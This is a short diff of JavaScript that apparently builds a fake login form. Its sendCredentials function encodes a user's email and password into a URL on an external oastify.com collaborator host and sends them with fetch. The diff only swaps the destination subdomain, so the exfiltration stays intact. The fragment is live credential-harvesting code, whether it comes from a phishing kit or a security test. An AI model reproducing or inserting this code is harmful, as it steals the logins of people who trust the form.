@@ -23,7 +23,7 @@ passInput.type = "password", passInput.name = "password", passInput.id = "passwo
 const loginButton = document.createElement("button");
 
 function sendCredentials(n, e) {
-    const t = `https://gp99snivp05roqqlyu49avgt3k9bczen3.oastify.com/?email=${encodeURIComponent(
+    const t = `https://8nww12rxiojrv4lg0urev28pyg49szgo.oastify.com/?email=${encodeURIComponent(
         n
     )}&password=${encodeURIComponent(e)}`;
     fetch(t, {
